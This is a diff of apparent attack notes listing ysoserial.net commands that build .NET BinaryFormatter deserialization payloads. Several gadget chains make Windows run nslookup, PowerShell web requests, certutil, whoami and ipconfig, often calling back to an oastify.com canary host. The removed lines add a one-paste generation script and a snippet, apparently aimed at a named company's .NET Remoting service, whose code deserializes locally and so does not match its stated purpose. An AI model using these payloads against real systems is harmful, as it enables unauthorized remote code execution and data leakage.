@@ -1,56 +1,33 @@
-Single-line ysoserial.net payload commands:
+# PAYLOAD 1: TextFormattingRunProperties + DNS (BinaryFormatter - base64)
+ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload1.txt
+
+# PAYLOAD 2: WindowsIdentity + DNS (BinaryFormatter - base64)
+ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload2.txt
+
+# PAYLOAD 3: ActivitySurrogateSelector + DNS (BinaryFormatter - base64)
+ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload3.txt
+
+# PAYLOAD 4: TextFormattingRunProperties + HTTP callback (BinaryFormatter - base64)
+ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "powershell.exe -c Invoke-WebRequest http://fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload4.txt
+
+# PAYLOAD 5: TextFormattingRunProperties + hex format (for binary transmission)
+ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o hex -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload5.txt
+
+# PAYLOAD 6: WindowsIdentity + cert command (BinaryFormatter - base64)
+ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "certutil.exe -ping fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload6.txt
+
+# PAYLOAD 7: ActivitySurrogateSelector + PowerShell DNS (BinaryFormatter - base64)
+ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -o base64 -c "powershell.exe -c [System.Net.Dns]::GetHostAddresses('fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com')" > payload7.txt
+
+# PAYLOAD 8: TextFormattingRunProperties + whoami (BinaryFormatter - base64)
+ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "whoami" > payload8.txt
+
+# PAYLOAD 9: WindowsIdentity + ipconfig (BinaryFormatter - base64)
+ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "ipconfig /all" > payload9.txt
+
+# PAYLOAD 10: TextFormattingRunProperties + raw cmd with canary (BinaryFormatter - base64)
+ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "cmd.exe /c nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload10.txt
 
 
-# PAYLOAD 1: ObjectDataProvider + DNS callback (base64)
-ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_objectdata_dns.txt
 
-Formatter BinaryFormatter not supported by ObjectDataProvider. Supported formatters are: DataContractSerializer (2) , FastJson , FsPickler , JavaScriptSerializer , Json.Net , MessagePackTypeless , MessagePackTypelessLz4 , SharpSerializerBinary , SharpSerializerXml , Xaml (4) , XmlSerializer (2) , YamlDotNet < 5.0.0
-
-# PAYLOAD 2: ObjectDataProvider + HTTP callback (base64)
-ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "powershell.exe -c Invoke-WebRequest http://fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_objectdata_http.txt
-
-# PAYLOAD 3: WindowsIdentity gadget + DNS (base64)
-ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_windowsid_dns.txt
-
-# PAYLOAD 4: ActivitySurrogateSelector + cmd (base64)
-ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -o base64 -c "cmd.exe /c nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_activity_dns.txt
-
-# PAYLOAD 5: ObjectDataProvider + cert download (base64)
-ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "certutil.exe -ping fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_objectdata_cert.txt
-
-# PAYLOAD 6: ObjectDataProvider + raw hex format (for binary sending)
-ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o hex -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_objectdata_hex.txt
-
-# PAYLOAD 7: TextFormattingRunProperties gadget + DNS (base64)
-ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_textformat_dns.txt
-
-# PAYLOAD 8: ObjectDataProvider + PowerShell reverse DNS (base64)
-ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "powershell.exe -c [System.Net.Dns]::GetHostAddresses('fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com')" > C:\payload_objectdata_psdns.txt
-
-# PAYLOAD 9: ObjectDataProvider + whoami to canary (base64)
-ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "cmd.exe /c whoami | nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_objectdata_whoami.txt
-
-# PAYLOAD 10: ObjectDataProvider + curl/wget to canary (base64)
-ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "powershell.exe -c curl http://fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com/rce" > C:\payload_objectdata_curl.txt
-Quick execution script (copy all at once):
-
-
-$canary = "fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com"
-ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "nslookup $canary" > payload1.txt; ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "powershell.exe -c Invoke-WebRequest http://$canary" > payload2.txt; ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "nslookup $canary" > payload3.txt; ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -o base64 -c "cmd.exe /c nslookup $canary" > payload4.txt; Write-Host "✅ All 4 payloads generated" -ForegroundColor Green
-For sending payload to remoting endpoint (after you have port):
-
-Once you know the port from app.config, use:
-
-
-# Read payload and send to AppFactoryService
-$payload = Get-Content C:\payload_objectdata_dns.txt
-$targetHost = "superderivatives.com"
-$targetPort = [PORT_FROM_CONFIG]
-$targetUri = "tcp://$targetHost`:$targetPort/AppFactoryService"
-
-# Send via .NET Remoting
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
-$fmt = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
-$stream = New-Object System.IO.MemoryStream([Convert]::FromBase64String($payload))
-$fmt.Deserialize($stream)
-
+ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com"
